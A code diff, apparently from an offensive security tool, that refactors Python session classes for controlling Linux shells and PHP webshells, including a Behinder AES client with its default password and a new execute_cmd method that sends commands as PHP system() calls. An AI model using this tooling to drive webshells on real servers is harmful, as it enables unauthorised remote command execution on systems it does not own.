@@ -70,6 +70,7 @@ SUBMIT_WRAPPER_LINUXSHELL = (
 )
 
 __all__ = [
+    "Session",
     "LinuxShellSession",
     "PHPWebshell",
     "PHPWebshellNormal",
@@ -80,8 +81,12 @@ __all__ = [
     "submit_all",
 ]
 
+class Session:
+    def execute_cmd(self, cmd: str) -> t.Union[str, None]:
+        raise NotImplementedError()
 
-class LinuxShellSession:
+
+class LinuxShellSession(Session):
     def __init__(self, submit_raw):
         self.submit_raw = submit_raw
         self.info = {}
@@ -176,13 +181,16 @@ class LinuxShellSession:
             return None
 
 
-class PHPWebshell:
+class PHPWebshell(Session):
     pass
 
 
 class PHPWebshellMixin:
     def submit_raw(self, payload_raw: str) -> t.Tuple[int, str]:
         raise NotImplementedError()
+
+    def execute_cmd(self, cmd: str) -> str:
+        return self.submit(f"system({cmd!r});")
 
     def submit(self, payload: str) -> str:
         start, stop = (
@@ -222,7 +230,7 @@ class PHPWebshellMixin:
         return text[idx_start + len(start) : idx_stop]
 
 
-class PHPWebshellNormal(PHPWebshell, PHPWebshellMixin):
+class PHPWebshellNormal(PHPWebshellMixin, PHPWebshell):
     def __init__(
         self,
         method: str,
@@ -238,7 +246,7 @@ class PHPWebshellNormal(PHPWebshell, PHPWebshellMixin):
         self.data = {} if data is None else data
 
     def __repr__(self) -> str:
-        return f"session.PHPWebshellNormal(**{{{self.__dict__!r}}})"
+        return f"session.PHPWebshellNormal(**{self.__dict__!r})"
 
     def submit_raw(self, payload):
         try:
@@ -257,7 +265,7 @@ class PHPWebshellNormal(PHPWebshell, PHPWebshellMixin):
             return None
 
 
-class PHPWebshellBehinderAES(PHPWebshell, PHPWebshellMixin):
+class PHPWebshellBehinderAES(PHPWebshellMixin, PHPWebshell):
     def __init__(self, url: str, password="rebeyond"):
         self.url = url
         self.key = md5_encode(password)[:16].encode()
@@ -271,7 +279,7 @@ class PHPWebshellBehinderAES(PHPWebshell, PHPWebshellMixin):
         return f"session.PHPWebshellBehinderAES(url={repr(self.url)})"
 
 
-class PHPWebshellExp(PHPWebshell, PHPWebshellMixin):
+class PHPWebshellExp(PHPWebshellMixin, PHPWebshell):
     def __init__(self, exp: t.Callable[[Url, Payload], t.Tuple[int, str]], url: str):
         """根据Exp函数获得Webshell session
 
@@ -287,7 +295,7 @@ class PHPWebshellExp(PHPWebshell, PHPWebshellMixin):
         return f"session.PHPWebshellExp(url={repr(self.url)}, exp={self.exp.__name__})"
 
 
-class PHPWebshellUser(PHPWebshell, PHPWebshellMixin):
+class PHPWebshellUser(PHPWebshellMixin, PHPWebshell):
     def __init__(self, submit_raw: t.Callable[[str], t.Tuple[int, str]]):
         """手动传入submit_raw函数
 
